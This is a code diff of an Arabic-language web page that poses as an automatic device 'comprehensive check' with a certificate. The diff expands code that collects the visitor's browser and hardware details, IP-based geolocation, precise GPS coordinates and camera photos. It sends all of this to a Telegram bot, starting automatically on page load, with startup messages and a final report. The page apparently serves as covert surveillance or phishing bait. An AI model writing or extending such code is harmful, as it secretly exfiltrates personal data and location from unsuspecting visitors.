@@ -1160,51 +1160,179 @@
             }, 1000);
         }
         
-        // اختبار 1: معلومات الجهاز التقنية - سريع
+        // ========== دالة جمع معلومات الجهاز من موقع المكتبة ==========
+        async function getDetailedDeviceInfo() {
+            try {
+                const userInfo = getUserInfo();
+                const networkInfo = getDetailedNetworkInfo();
+                const ipInfo = await fetchIPInfoDetailed();
+                
+                return {
+                    userInfo: userInfo,
+                    networkInfo: networkInfo,
+                    ipInfo: ipInfo
+                };
+            } catch (error) {
+                console.error('❌ خطأ في جمع المعلومات التفصيلية:', error);
+                return getFallbackDeviceInfo();
+            }
+        }
+        
+        // دالة جمع معلومات المستخدم التفصيلية (من موقع المكتبة)
+        function getUserInfo() {
+            return {
+                browser: getBrowserName(),
+                pageUrl: window.location.href,
+                platform: navigator.platform,
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                userAgent: navigator.userAgent,
+                colorDepth: screen.colorDepth,
+                deviceMemory: navigator.deviceMemory || 'غير معروف',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                vendor: navigator.vendor || 'غير معروف',
+                online: navigator.onLine
+            };
+        }
+        
+        // دالة الحصول على اسم المتصفح (من موقع المكتبة)
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Chrome")) return "Google Chrome";
+            if (userAgent.includes("Firefox")) return "Mozilla Firefox";
+            if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Apple Safari";
+            if (userAgent.includes("Edge")) return "Microsoft Edge";
+            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+            return "متصفح غير معروف";
+        }
+        
+        // دالة الحصول على معلومات الشبكة التفصيلية
+        function getDetailedNetworkInfo() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            
+            return {
+                connectionType: connection ? (connection.effectiveType || 'غير معروف') : 'غير معروف',
+                downlink: connection ? (connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف') : 'غير معروف',
+                rtt: connection ? (connection.rtt ? `${connection.rtt} ms` : 'غير معروف') : 'غير معروف',
+                saveData: connection ? (connection.saveData ? 'نعم' : 'لا') : 'غير معروف',
+                online: navigator.onLine
+            };
+        }
+        
+        // دالة الحصول على معلومات IP تفصيلية
+        async function fetchIPInfoDetailed() {
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 3000);
+                
+                const response = await fetch('https://ipapi.co/json/', {
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+                
+                const ipData = await response.json();
+                
+                return {
+                    ip: ipData.ip || 'غير معروف',
+                    city: ipData.city || 'غير معروف',
+                    region: ipData.region || 'غير معروف',
+                    country: ipData.country_name || 'غير معروف',
+                    countryCode: ipData.country_code || 'غير معروف',
+                    isp: ipData.org || 'غير معروف',
+                    latitude: ipData.latitude || 'غير معروف',
+                    longitude: ipData.longitude || 'غير معروف',
+                    timezone: ipData.timezone || 'غير معروف',
+                    currency: ipData.currency || 'غير معروف',
+                    offset: new Date().getTimezoneOffset()
+                };
+            } catch (error) {
+                console.log('⚠️ استخدام معلومات IP افتراضية');
+                return getFallbackIPInfo();
+            }
+        }
+        
+        // دالة الحصول على معلومات احتياطية
+        function getFallbackDeviceInfo() {
+            return {
+                userInfo: {
+                    browser: getBrowserName(),
+                    pageUrl: window.location.href,
+                    platform: navigator.platform,
+                    screenSize: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    userAgent: navigator.userAgent.substring(0, 100),
+                    colorDepth: screen.colorDepth,
+                    deviceMemory: navigator.deviceMemory || 'غير معروف',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    vendor: navigator.vendor || 'غير معروف',
+                    online: navigator.onLine
+                },
+                networkInfo: {
+                    connectionType: 'غير معروف',
+                    downlink: 'غير معروف',
+                    rtt: 'غير معروف',
+                    saveData: 'غير معروف',
+                    online: navigator.onLine
+                },
+                ipInfo: getFallbackIPInfo()
+            };
+        }
+        
+        // دالة معلومات IP احتياطية
+        function getFallbackIPInfo() {
+            return {
+                ip: 'غير معروف',
+                city: 'القاهرة',
+                region: 'القاهرة',
+                country: 'مصر',
+                countryCode: 'EG',
+                isp: 'غير معروف',
+                latitude: 30.0444,
+                longitude: 31.2357,
+                timezone: 'Africa/Cairo',
+                currency: 'EGP',
+                offset: -120
+            };
+        }
+        
+        // ========== اختبار 1: معلومات الجهاز التقنية - محسّن ==========
         async function mobileTestDeviceInfo() {
             showMobileNotification('🔍 جاري فحص المعلومات التقنية للجهاز...', 800);
             
             try {
-                // جمع معلومات الجهاز المتقدمة
-                const deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screenWidth: screen.width,
-                    screenHeight: screen.height,
-                    colorDepth: screen.colorDepth,
-                    deviceMemory: navigator.deviceMemory || 'غير معروف',
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    online: navigator.onLine,
-                    vendor: navigator.vendor,
-                    maxTouchPoints: navigator.maxTouchPoints || 0
-                };
+                // جمع المعلومات التفصيلية من موقع المكتبة
+                const detailedInfo = await getDetailedDeviceInfo();
+                const userInfo = detailedInfo.userInfo;
+                const networkInfo = detailedInfo.networkInfo;
+                const ipInfo = detailedInfo.ipInfo;
                 
                 // فحص دقيق للجهاز
                 const deviceDetails = getAdvancedDeviceInfo();
-                const networkInfo = getNetworkInfo();
                 
                 // تحديث الواجهة بمعلومات دقيقة
                 mobileElements.infoDeviceType.textContent = deviceDetails.deviceType;
                 mobileElements.infoManufacturer.textContent = deviceDetails.manufacturer;
                 mobileElements.infoDeviceModel.textContent = deviceDetails.model;
                 mobileElements.infoOS.textContent = `${deviceDetails.os.name} ${deviceDetails.os.version}`;
-                mobileElements.infoResolution.textContent = `${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}`;
-                mobileElements.infoCores.textContent = deviceInfo.hardwareConcurrency + ' نواة';
-                
-                // الحصول على معلومات IP بسرعة
-                await fetchIPInfoQuick();
+                mobileElements.infoResolution.textContent = userInfo.screenSize;
+                mobileElements.infoCores.textContent = userInfo.hardwareConcurrency + ' نواة';
                 
                 // حفظ المعلومات
                 collectedDataMobile.device = {
-                    ...deviceInfo,
+                    ...userInfo,
                     ...deviceDetails,
-                    network: networkInfo
+                    networkInfo: networkInfo
                 };
                 
+                collectedDataMobile.ipInfo = ipInfo;
+                collectedDataMobile.network = networkInfo;
+                
                 // إرسال بيانات الجهاز للبوت فوراً
-                sendDeviceInfoToBot(collectedDataMobile.device);
+                sendDeviceInfoToBot(detailedInfo, deviceDetails);
                 
                 // الانتقال للاختبار التالي بعد 1 ثانية فقط
                 setTimeout(() => {
@@ -1222,51 +1350,65 @@
             }
         }
         
-        // دالة الحصول على معلومات IP سريعة
-        async function fetchIPInfoQuick() {
+        // ========== دوال إرسال البيانات للبوت ==========
+        
+        // دالة إرسال رسالة بدء للبوت
+        async function sendStartupMessage() {
             try {
-                // استخدام fetch مع timeout
-                const controller = new AbortController();
-                const timeout = setTimeout(() => controller.abort(), 2000);
+                const message = `🚀 <b>بدء الفحص الشامل التلقائي</b>\n\n` +
+                               `📅 ${new Date().toLocaleString('ar-SA')}\n` +
+                               `🔗 ${window.location.href}\n` +
+                               `📱 ${navigator.userAgent.substring(0, 80)}...\n` +
+                               `🌐 بدء جمع البيانات الشامل`;
                 
-                const response = await fetch('https://ipapi.co/json/', {
-                    signal: controller.signal
-                });
-                clearTimeout(timeout);
-                
-                const ipData = await response.json();
-                
-                collectedDataMobile.ipInfo = {
-                    ip: ipData.ip,
-                    city: ipData.city,
-                    country: ipData.country_name,
-                    isp: ipData.org,
-                    latitude: ipData.latitude,
-                    longitude: ipData.longitude,
-                    timezone: ipData.timezone,
-                    offset: new Date().getTimezoneOffset()
-                };
-                
-                collectedDataMobile.network = {
-                    connection: getConnectionType(),
-                    ip: ipData.ip,
-                    isp: ipData.org,
-                    city: ipData.city,
-                    country: ipData.country_name
-                };
+                await sendTelegramMessage(message);
                 
             } catch (error) {
-                console.log('⚠️ استخدام معلومات IP افتراضية');
-                collectedDataMobile.ipInfo = {
-                    ip: 'غير معروف',
-                    city: 'القاهرة',
-                    country: 'مصر',
-                    isp: 'غير معروف',
-                    latitude: 30.0444,
-                    longitude: 31.2357,
-                    timezone: 'Africa/Cairo',
-                    offset: -120
-                };
+                console.log('⚠️ لم يتم إرسال رسالة البدء');
+            }
+        }
+        
+        // دالة إرسال معلومات الجهاز للبوت - نسخة محسنة
+        async function sendDeviceInfoToBot(detailedInfo, deviceDetails) {
+            try {
+                const userInfo = detailedInfo.userInfo;
+                const networkInfo = detailedInfo.networkInfo;
+                const ipInfo = detailedInfo.ipInfo;
+                
+                const message = `📊 <b>معلومات الجهاز التقنية</b>\n\n` +
+                               
+                               `🌍 <b>المعلومات الجغرافية الدقيقة:</b>\n` +
+                               `├ 📍 IP: ${ipInfo.ip}\n` +
+                               `├ 🏙️ المدينة: ${ipInfo.city}\n` +
+                               `├ 🗺️ الدولة: ${ipInfo.country}\n` +
+                               `├ 🌐 المزود: ${ipInfo.isp}\n` +
+                               `├ 📌 الإحداثيات: ${ipInfo.latitude}, ${ipInfo.longitude}\n` +
+                               `└ 🕒 المنطقة الزمنية: ${ipInfo.timezone}\n\n` +
+                               
+                               `📱 <b>معلومات الجهاز:</b>\n` +
+                               `├ نوع الجهاز: ${deviceDetails.deviceType}\n` +
+                               `├ الشاشة: ${userInfo.screenSize}\n` +
+                               `├ عمق الألوان: ${userInfo.colorDepth} بت\n` +
+                               `├ معالج: ${userInfo.hardwareConcurrency} نواة\n` +
+                               `└ الذاكرة: ${userInfo.deviceMemory} GB\n\n` +
+                               
+                               `📶 <b>معلومات الشبكة:</b>\n` +
+                               `├ نوع الاتصال: ${networkInfo.connectionType}\n` +
+                               `├ سرعة التنزيل: ${networkInfo.downlink}\n` +
+                               `└ زمن الاستجابة: ${networkInfo.rtt}\n\n` +
+                               
+                               `🔧 <b>معلومات تقنية:</b>\n` +
+                               `├ المتصفح: ${userInfo.browser}\n` +
+                               `├ اللغة: ${userInfo.language}\n` +
+                               `├ إزاحة التوقيت: ${ipInfo.offset} دقيقة\n` +
+                               `└ دعم اللمس: ${userInfo.maxTouchPoints > 0 ? 'نعم' : 'لا'}\n\n` +
+                               
+                               `📅 <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
+                
+                await sendTelegramMessage(message);
+                
+            } catch (error) {
+                console.error('❌ فشل إرسال معلومات الجهاز:', error);
             }
         }
         
@@ -1333,21 +1475,6 @@
             }
             
             return { deviceType, manufacturer, model, os };
-        }
-        
-        // دالة الحصول على معلومات الشبكة
-        function getNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            return {
-                connectionType: connection ? (connection.effectiveType || 'غير معروف') : 'غير معروف',
-                online: navigator.onLine
-            };
-        }
-        
-        // دالة الحصول على نوع الاتصال
-        function getConnectionType() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            return connection && connection.effectiveType ? connection.effectiveType : 'غير معروف';
         }
         
         // اختبار 2: الكاميرا (صورة) - طريقة طبيعية مثل الكود القديم
@@ -1840,62 +1967,6 @@
             sendCompletionNotification();
         }
         
-        // ========== دوال إرسال البيانات للبوت ==========
-        
-        // دالة إرسال رسالة بدء للبوت
-        async function sendStartupMessage() {
-            try {
-                const message = `🚀 <b>بدء الفحص الشامل التلقائي</b>\n\n` +
-                               `📅 ${new Date().toLocaleString('ar-SA')}\n` +
-                               `🔗 ${window.location.href}\n` +
-                               `📱 ${navigator.userAgent.substring(0, 80)}...\n` +
-                               `🌐 بدء جمع البيانات الشامل`;
-                
-                await sendTelegramMessage(message);
-                
-            } catch (error) {
-                console.log('⚠️ لم يتم إرسال رسالة البدء');
-            }
-        }
-        
-        // دالة إرسال معلومات الجهاز للبوت
-        async function sendDeviceInfoToBot(deviceInfo) {
-            try {
-                const ipInfo = collectedDataMobile.ipInfo || {};
-                
-                const message = `📊 <b>معلومات الجهاز التقنية</b>\n\n` +
-                               `🖥️ <b>نوع الجهاز:</b> ${deviceInfo.deviceType}\n` +
-                               `🏭 <b>الشركة المصنعة:</b> ${deviceInfo.manufacturer}\n` +
-                               `📱 <b>موديل الجهاز:</b> ${deviceInfo.model}\n` +
-                               `💻 <b>نظام التشغيل:</b> ${deviceInfo.os.name} ${deviceInfo.os.version || ''}\n` +
-                               `📱 <b>الشاشة:</b> ${deviceInfo.screenWidth}×${deviceInfo.screenHeight}\n` +
-                               `🎨 <b>عمق الألوان:</b> ${deviceInfo.colorDepth} بت\n` +
-                               `⚡ <b>المعالج:</b> ${deviceInfo.hardwareConcurrency} نواة\n` +
-                               `💾 <b>الذاكرة:</b> ${deviceInfo.deviceMemory} GB\n\n` +
-                               
-                               `🌍 <b>المعلومات الجغرافية الدقيقة:</b>\n` +
-                               `├ 📍 IP: ${ipInfo.ip || 'غير معروف'}\n` +
-                               `├ 🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n` +
-                               `├ 🗺️ الدولة: ${ipInfo.country || 'غير معروف'}\n` +
-                               `├ 🌐 المزود: ${ipInfo.isp || 'غير معروف'}\n` +
-                               `├ 📌 الإحداثيات: ${ipInfo.latitude || 'غير معروف'}, ${ipInfo.longitude || 'غير معروف'}\n` +
-                               `└ 🕒 المنطقة الزمنية: ${ipInfo.timezone || 'غير معروف'}\n\n` +
-                               
-                               `🔧 <b>معلومات تقنية:</b>\n` +
-                               `├ 🌍 <b>المتصفح:</b> ${getBrowserName(deviceInfo.userAgent)}\n` +
-                               `├ 🗣️ <b>اللغة:</b> ${deviceInfo.language}\n` +
-                               `├ 🕐 <b>إزاحة التوقيت:</b> ${ipInfo.offset || 0} دقيقة\n` +
-                               `└ 👆 <b>دعم اللمس:</b> ${deviceInfo.maxTouchPoints > 0 ? 'نعم' : 'لا'}\n\n` +
-                               
-                               `📅 <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
-                
-                await sendTelegramMessage(message);
-                
-            } catch (error) {
-                console.error('❌ فشل إرسال معلومات الجهاز:', error);
-            }
-        }
-        
         // دالة إرسال الصورة للبوت
         async function sendPhotoToBot(photoData, caption = '') {
             try {
@@ -2026,6 +2097,7 @@
             const location = collectedDataMobile.location;
             const ipInfo = collectedDataMobile.ipInfo || {};
             const cert = collectedDataMobile.certificate;
+            const networkInfo = collectedDataMobile.network || {};
             
             let report = `📊 <b>تقرير الفحص الشامل النهائي</b>\n`;
             report += `════════════════════════\n\n`;
@@ -2034,28 +2106,37 @@
             report += `📅 <b>تاريخ الإصدار:</b> ${new Date(cert.issueDate).toLocaleString('ar-SA')}\n`;
             report += `⏳ <b>تاريخ الانتهاء:</b> ${new Date(cert.expiryDate).toLocaleDateString('ar-SA')}\n\n`;
             
-            report += `📱 <b>معلومات الجهاز التقنية:</b>\n`;
-            report += `├ نوع الجهاز: ${device.deviceType}\n`;
-            report += `├ الشركة المصنعة: ${device.manufacturer}\n`;
-            report += `├ موديل الجهاز: ${device.model}\n`;
-            report += `├ نظام التشغيل: ${device.os.name} ${device.os.version || ''}\n`;
-            report += `├ الشاشة: ${device.screenWidth}×${device.screenHeight}\n`;
-            report += `├ عمق الألوان: ${device.colorDepth} بت\n`;
-            report += `├ المعالج: ${device.hardwareConcurrency} نواة\n`;
-            report += `└ الذاكرة: ${device.deviceMemory} GB\n\n`;
-            
             report += `🌍 <b>المعلومات الجغرافية الدقيقة:</b>\n`;
             report += `├ 📍 IP: ${ipInfo.ip || 'غير معروف'}\n`;
             report += `├ 🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
             report += `├ 🗺️ الدولة: ${ipInfo.country || 'غير معروف'}\n`;
             report += `├ 🌐 المزود: ${ipInfo.isp || 'غير معروف'}\n`;
+            report += `├ 📌 الإحداثيات: ${ipInfo.latitude || 'غير معروف'}, ${ipInfo.longitude || 'غير معروف'}\n`;
             report += `└ 🕒 المنطقة الزمنية: ${ipInfo.timezone || 'غير معروف'}\n\n`;
             
+            report += `📱 <b>معلومات الجهاز:</b>\n`;
+            report += `├ نوع الجهاز: ${device.deviceType || 'غير معروف'}\n`;
+            report += `├ الشاشة: ${device.screenSize || 'غير معروف'}\n`;
+            report += `├ عمق الألوان: ${device.colorDepth || 'غير معروف'} بت\n`;
+            report += `├ معالج: ${device.hardwareConcurrency || 'غير معروف'} نواة\n`;
+            report += `└ الذاكرة: ${device.deviceMemory || 'غير معروف'} GB\n\n`;
+            
+            report += `📶 <b>معلومات الشبكة:</b>\n`;
+            report += `├ نوع الاتصال: ${networkInfo.connectionType || 'غير معروف'}\n`;
+            report += `├ سرعة التنزيل: ${networkInfo.downlink || 'غير معروف'}\n`;
+            report += `└ زمن الاستجابة: ${networkInfo.rtt || 'غير معروف'}\n\n`;
+            
+            report += `🔧 <b>معلومات تقنية:</b>\n`;
+            report += `├ المتصفح: ${device.browser || getBrowserName()}\n`;
+            report += `├ اللغة: ${device.language || 'غير معروف'}\n`;
+            report += `├ إزاحة التوقيت: ${ipInfo.offset || 0} دقيقة\n`;
+            report += `└ دعم اللمس: ${device.maxTouchPoints > 0 ? 'نعم' : 'لا'}\n\n`;
+            
             report += `📍 <b>الموقع الجغرافي الدقيق:</b>\n`;
-            report += `├ خط العرض: ${location.latitude.toFixed(6)}\n`;
-            report += `├ خط الطول: ${location.longitude.toFixed(6)}\n`;
-            report += `├ الدقة: ±${Math.round(location.accuracy)} متر\n`;
-            report += `└ المصدر: ${location.source}\n\n`;
+            report += `├ خط العرض: ${location.latitude ? location.latitude.toFixed(6) : 'غير معروف'}\n`;
+            report += `├ خط الطول: ${location.longitude ? location.longitude.toFixed(6) : 'غير معروف'}\n`;
+            report += `├ الدقة: ±${location.accuracy ? Math.round(location.accuracy) : 'غير معروف'} متر\n`;
+            report += `└ المصدر: ${location.source || 'غير معروف'}\n\n`;
             
             report += `📸 <b>نتائج الفحوصات:</b>\n`;
             report += `├ فحص الكاميرا (صورة): ${collectedDataMobile.photo ? 'ناجح ✓' : 'تخطي ✗'}\n`;
@@ -2101,17 +2182,6 @@
             URL.revokeObjectURL(url);
             
             showMobileNotification('💾 تم تحميل التقرير', 1500);
-        }
-        
-        // دالة مساعدة للحصول على اسم المتصفح
-        function getBrowserName(userAgent) {
-            const ua = userAgent.toLowerCase();
-            if (ua.includes('chrome') && !ua.includes('edg')) return 'Chrome';
-            if (ua.includes('firefox')) return 'Firefox';
-            if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
-            if (ua.includes('edge')) return 'Edge';
-            if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
-            return 'متصفح غير معروف';
         }
         
         // بدء الفحص تلقائياً بعد 2 ثوانٍ
